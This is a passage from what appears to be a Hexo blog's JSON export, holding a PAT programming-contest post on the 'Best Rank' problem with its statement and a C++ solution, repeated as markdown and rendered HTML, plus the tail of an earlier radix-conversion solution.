class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> uLL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxn = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> tag, radix, res;</div><div class=\"line\">uLL ans = <span class=\"number\">0</span>, l, r;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">uLL <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"string\">'0'</span> &lt;= ch&amp;&amp;ch &lt;= <span class=\"string\">'9'</span>) <span class=\"keyword\">return</span> ch - <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> ch - <span class=\"string\">'a'</span> + <span class=\"number\">10</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; tag &gt;&gt; radix;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (tag == <span class=\"number\">2</span>) swap(a, b);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; a[i]; i++) ans = ans*radix + get(a[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; b[i]; i++) l = max(l, get(b[i]));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (l++, r = ans + <span class=\"number\">1</span>; l &lt;= r;)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tuLL mid = l + r &gt;&gt; <span class=\"number\">1</span>;</div><div class=\"line\">\t\tuLL check = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; b[i]; i++) check = check*mid + get(b[i]);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (check == ans) res = mid;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (check &gt;= ans) r = mid - <span class=\"number\">1</span>; <span class=\"keyword\">else</span> l = mid + <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tres ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, res) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"Impossible\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1012","date":"2017-02-13T10:53:14.000Z","_content":"\n## Description\n\n> 1012.The Best Rank (25)\n\n> To evaluate the performance of our first year CS majored students, we consider their grades of three courses only: C - C Programming Language, M - Mathematics (Calculus or Linear Algebra), and E - English. At the mean time, we encourage students by emphasizing on their best ranks -- that is, among the four ranks with respect to the three courses and the average grade, we print the best rank for each student.\n\n > For example, The grades of C, M, E and A - Average of 4 students are given as the following:\n\n> StudentID  C  M  E  A\n310101     98 85 88 90\n310102     70 95 88 84\n310103     82 87 94 88\n310104     91 91 91 91\nThen the best ranks for all the students are No.1 since the 1st one has done the best in C Programming Language, while the 2nd one in Mathematics, the 3rd one in English, and the last one in average.\n\n> Input\n\n> Each input file contains one test case. Each case starts with a line containing 2 numbers N and M (<=2000), which are the total number of students, and the number of students who would check their ranks, respectively. Then N lines follow, each contains a student ID which is a string of 6 digits, followed by the three integer grades (in the range of [0, 100]) of that student in the order of C, M and E. Then there are M lines, each containing a student ID.\n\n> Output\n\n> For each of the M students, print in one line the best rank for him/her, and the symbol of the corresponding rank, separated by a space.\n\n> The priorities of the ranking methods are ordered as A > C > M > E. Hence if there are two or more ways for a student to obtain the same best rank, output the one with the highest priority.\n\n> If a student is not on the grading list, simply output \"N/A\".\n\n> Sample Input\n5 6\n310101 98 85 88\n310102 70 95 88\n310103 82 87 94\n310104 91 91 91\n310105 85 90 90\n310101\n310102\n310103\n310104\n310105\n999999\n\n> Sample Output\n1 C\n1 M\n1 E\n1 A\n3 A\nN/A\n\n注意排名相同情况下，取相同的最高名次。\n\n分数要`int(sum / 3 + 0.5)`，但其实不四舍五入也能过。。\n\n## Code\n\n```\n#include <cstdio>\n#include <cmath>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef unsigned long long uLL;\nconst int maxN = 2e3 + 10;\n\nstruct S{\n\tstring name;\n\tint a[4];\n\tint b[4];\n\tint r[4];\n\tint g;\n}stu[maxN];\n\nint n, m;\nchar sym[] = \"ACME\";\nint tmp[maxN];\n\nint main()\n{\n\tcin >> n >> m;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> stu[i].name;\n\t\tfloat tmp = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tcin >> stu[i].a[j];\n\t\t\ttmp += stu[i].a[j];\n\t\t\tstu[i].b[j] = stu[i].a[j];\n\t\t}\n\t\tstu[i].a[0] = tmp / 3.0;\n\t\tstu[i].b[0] = tmp / 3.0;\n\t}\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++) tmp[j] = j;\n\t\tfor (int p = 0; p < n - 1; p++)\n\t\t\tfor (int q = p + 1; q < n; q++)\n\t\t\t\tif (stu[q].a[i] > stu[p].a[i])\n\t\t\t\t{\n\t\t\t\t\tswap(stu[q].a[i], stu[p].a[i]);\n\t\t\t\t\tswap(tmp[p], tmp[q]);\n\t\t\t\t}\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tstu[tmp[j]].r[i] = j;\n\t\tfor (int j = 0; j < n - 1; j++)\n\t\t{\n\t\t\tif (stu[tmp[j]].b[i] == stu[tmp[j + 1]].b[i])\n\t\t\t\tstu[tmp[j + 1]].r[i] = stu[tmp[j]].r[i];\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint tmp = maxN;\n\t\tfor (int j = 0; j < 4; j++)\n\t\t\tif (stu[i].r[j] < tmp)\n\t\t\t{\n\t\t\t\ttmp = stu[i].r[j];\n\t\t\t\tstu[i].g = j;\n\t\t\t}\n\t}\n\t//\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tstring in;\n\t\tcin >> in;\n\t\tint j = 0;\n\t\tfor (j = 0; j < n; j++)\n\t\t\tif (stu[j].name == in)\n\t\t\t{\n\t\t\t\tcout << stu[j].r[stu[j].g] + 1 << ' ' << sym[stu[j].g] << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\tif (j == n)\n\t\t\tcout << \"N/A\" << endl;\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1012.md","raw":"---\ntitle: PAT advanced 1012\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-13 18:53:14\n---\n\n## Description\n\n> 1012.The Best Rank (25)\n\n> To evaluate the performance of our first year CS majored students, we consider their grades of three courses only: C - C Programming Language, M - Mathematics (Calculus or Linear Algebra), and E - English. At the mean time, we encourage students by emphasizing on their best ranks -- that is, among the four ranks with respect to the three courses and the average grade, we print the best rank for each student.\n\n > For example, The grades of C, M, E and A - Average of 4 students are given as the following:\n\n> StudentID  C  M  E  A\n310101     98 85 88 90\n310102     70 95 88 84\n310103     82 87 94 88\n310104     91 91 91 91\nThen the best ranks for all the students are No.1 since the 1st one has done the best in C Programming Language, while the 2nd one in Mathematics, the 3rd one in English, and the last one in average.\n\n> Input\n\n> Each input file contains one test case. Each case starts with a line containing 2 numbers N and M (<=2000), which are the total number of students, and the number of students who would check their ranks, respectively. Then N lines follow, each contains a student ID which is a string of 6 digits, followed by the three integer grades (in the range of [0, 100]) of that student in the order of C, M and E. Then there are M lines, each containing a student ID.\n\n> Output\n\n> For each of the M students, print in one line the best rank for him/her, and the symbol of the corresponding rank, separated by a space.\n\n> The priorities of the ranking methods are ordered as A > C > M > E. Hence if there are two or more ways for a student to obtain the same best rank, output the one with the highest priority.\n\n> If a student is not on the grading list, simply output \"N/A\".\n\n> Sample Input\n5 6\n310101 98 85 88\n310102 70 95 88\n310103 82 87 94\n310104 91 91 91\n310105 85 90 90\n310101\n310102\n310103\n310104\n310105\n999999\n\n> Sample Output\n1 C\n1 M\n1 E\n1 A\n3 A\nN/A\n\n注意排名相同情况下，取相同的最高名次。\n\n分数要`int(sum / 3 + 0.5)`，但其实不四舍五入也能过。。\n\n## Code\n\n```\n#include <cstdio>\n#include <cmath>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef unsigned long long uLL;\nconst int maxN = 2e3 + 10;\n\nstruct S{\n\tstring name;\n\tint a[4];\n\tint b[4];\n\tint r[4];\n\tint g;\n}stu[maxN];\n\nint n, m;\nchar sym[] = \"ACME\";\nint tmp[maxN];\n\nint main()\n{\n\tcin >> n >> m;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> stu[i].name;\n\t\tfloat tmp = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tcin >> stu[i].a[j];\n\t\t\ttmp += stu[i].a[j];\n\t\t\tstu[i].b[j] = stu[i].a[j];\n\t\t}\n\t\tstu[i].a[0] = tmp / 3.0;\n\t\tstu[i].b[0] = tmp / 3.0;\n\t}\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++) tmp[j] = j;\n\t\tfor (int p = 0; p < n - 1; p++)\n\t\t\tfor (int q = p + 1; q < n; q++)\n\t\t\t\tif (stu[q].a[i] > stu[p].a[i])\n\t\t\t\t{\n\t\t\t\t\tswap(stu[q].a[i], stu[p].a[i]);\n\t\t\t\t\tswap(tmp[p], tmp[q]);\n\t\t\t\t}\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tstu[tmp[j]].r[i] = j;\n\t\tfor (int j = 0; j < n - 1; j++)\n\t\t{\n\t\t\tif (stu[tmp[j]].b[i] == stu[tmp[j + 1]].b[i])\n\t\t\t\tstu[tmp[j + 1]].r[i] = stu[tmp[j]].r[i];\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint tmp = maxN;\n\t\tfor (int j = 0; j < 4; j++)\n\t\t\tif (stu[i].r[j] < tmp)\n\t\t\t{\n\t\t\t\ttmp = stu[i].r[j];\n\t\t\t\tstu[i].g = j;\n\t\t\t}\n\t}\n\t//\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tstring in;\n\t\tcin >> in;\n\t\tint j = 0;\n\t\tfor (j = 0; j < n; j++)\n\t\t\tif (stu[j].name == in)\n\t\t\t{\n\t\t\t\tcout << stu[j].r[stu[j].g] + 1 << ' ' << sym[stu[j].g] << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\tif (j == n)\n\t\t\tcout << \"N/A\" << endl;\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1012","published":1,"updated":"2017-02-13T11:14:26.696Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzy0023hv18s66gabec","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1012.The Best Rank (25)</p>\n<p>To evaluate the performance of our first year CS majored students, we consider their grades of three courses only: C - C Programming Language, M - Mathematics (Calculus or Linear Algebra), and E - English. At the mean time, we encourage students by emphasizing on their best ranks – that is, among the four ranks with respect to the three courses and the average grade, we print the best rank for each student.</p>\n<p>For example, The grades of C, M, E and A - Average of 4 students are given as the following:</p>\n<p>StudentID  C  M  E  A<br>310101     98 85 88 90<br>310102     70 95 88 84<br>310103     82 87 94 88<br>310104     91 91 91 91<br>Then the best ranks for all the students are No.1 since the 1st one has done the best in C Programming Language, while the 2nd one in Mathematics, the 3rd one in English, and the last one in average.</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 2 numbers N and M (&lt;=2000), which are the total number of students, and the number of students who would check their ranks, respectively. Then N lines follow, each contains a student ID which is a string of 6 digits, followed by the three integer grades (in the range of [0, 100]) of that student in the order of C, M and E. Then there are M lines, each containing a student ID.</p>\n<p>Output</p>\n<p>For each of the M students, print in one line the best rank for him/her, and the symbol of the corresponding rank, separated by a space.</p>\n<p>The priorities of the ranking methods are ordered as A &gt; C &gt; M &gt; E. Hence if there are two or more ways for a student to obtain the same best rank, output the one with the highest priority.</p>\n<p>If a student is not on the grading list, simply output “N/A”.</p>\n<p>Sample Input<br>5 6<br>310101 98 85 88<br>310102 70 95 88<br>310103 82 87 94<br>310104 91 91 91<br>310105 85 90 90<br>310101<br>310102<br>310103<br>310104<br>310105<br>999999</p>\n<p>Sample Output<br>1 C<br>1 M<br>1 E<br>1 A<br>3 A<br>N/A</p>\n</blockquote>\n<p>注意排名相同情况下，取相同的最高名次。</p>\n<p>分数要<code>int(sum / 3 + 0.5)</code>，但其实不四舍五入也能过。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> uLL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">2e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> S&#123;</div><div class=\"line\">\t<span class=\"built_in\">string</span> name;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> b[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> r[<span class=\"number\">4</span>];</div><div class=\"line\">\t<span class=\"keyword\">int</span> g;</div><div class=\"line\">&#125;stu[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"keyword\">char</span> sym[] = <span class=\"string\">\"ACME\"</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> tmp[maxN];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n &gt;&gt; m;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; stu[i].name;</div><div class=\"line\">\t\t<span class=\"keyword\">float</span> tmp = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; stu[i].a[j];</div><div class=\"line\">\t\t\ttmp += stu[i].a[j];</div><div class=\"line\">\t\t\tstu[i].b[j] = stu[i].a[j];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tstu[i].a[<span class=\"number\">0</span>] = tmp / <span class=\"number\">3.0</span>;</div><div class=\"line\">\t\tstu[i].b[<span class=\"number\">0</span>] = tmp / <span class=\"number\">3.0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) tmp[j] = j;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; n - <span class=\"number\">1</span>; p++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> q = p + <span class=\"number\">1</span>; q &lt; n; q++)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (stu[q].a[i] &gt; stu[p].a[i])</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tswap(stu[q].a[i], stu[p].a[i]);</div><div class=\"line\">\t\t\t\t\tswap(tmp[p], tmp[q]);</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\tstu[tmp[j]].r[i] = j;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n - <span class=\"number\">1</span>; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[tmp[j]].b[i] == stu[tmp[j + <span class=\"number\">1</span>]].b[i])</div><div class=\"line\">\t\t\t\tstu[tmp[j + <span class=\"number\">1</span>]].r[i] = stu[tmp[j]].r[i];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> tmp = maxN;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[i].r[j] &lt; tmp)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\ttmp = stu[i].r[j];</div><div class=\"line\">\t\t\t\tstu[i].g = j;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">string</span> in;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; in;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[j].name == in)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; stu[j].r[stu[j].g] + <span class=\"number\">1</span> &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; sym[stu[j].g] &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (j == n)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"N/A\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1012.The Best Rank (25)</p>\n<p>To evaluate the performance of our first year CS majored students, we consider their grades of three courses only: C - C Programming Language, M - Mathematics (Calculus or Linear Algebra), and E - English. At the mean time, we encourage students by emphasizing on their best ranks – that is, among the four ranks with respect to the three courses and the average grade, we print the best rank for each student.</p>\n<p>For example, The grades of C, M, E and A - Average of 4 students are given as the following:</p>\n<p>StudentID  C  M  E  A<br>310101     98 85 88 90<br>310102     70 95 88 84<br>310103     82 87 94 88<br>310104     91 91 91 91<br>Then the best ranks for all the students are No.1 since the 1st one has done the best in C Programming Language, while the 2nd one in Mathematics, the 3rd one in English, and the last one in average.</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case starts with a line containing 2 numbers N and M (&lt;=2000), which are the total number of students, and the number of students who would check their ranks, respectively. Then N lines follow, each contains a student ID which is a string of 6 digits, followed by the three integer grades (in the range of [0, 100]) of that student in the order of C, M and E. Then there are M lines, each containing a student ID.</p>\n<p>Output</p>\n<p>For each of the M students, print in one line the best rank for him/her, and the symbol of the corresponding rank, separated by a space.</p>\n<p>The priorities of the ranking methods are ordered as A &gt; C &gt; M &gt; E. Hence if there are two or more ways for a student to obtain the same best rank, output the one with the highest priority.</p>\n<p>If a student is not on the grading list, simply output “N/A”.</p>\n<p>Sample Input<br>5 6<br>310101 98 85 88<br>310102 70 95 88<br>310103 82 87 94<br>310104 91 91 91<br>310105 85 90 90<br>310101<br>310102<br>310103<br>310104<br>310105<br>999999</p>\n<p>Sample Output<br>1 C<br>1 M<br>1 E<br>1 A<br>3 A<br>N/A</p>\n</blockquote>\n<p>注意排名相同情况下，取相同的最高名次。</p>\n<p>分数要<code>int(sum / 3 + 0.5)</code>，但其实不四舍五入也能过。。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> 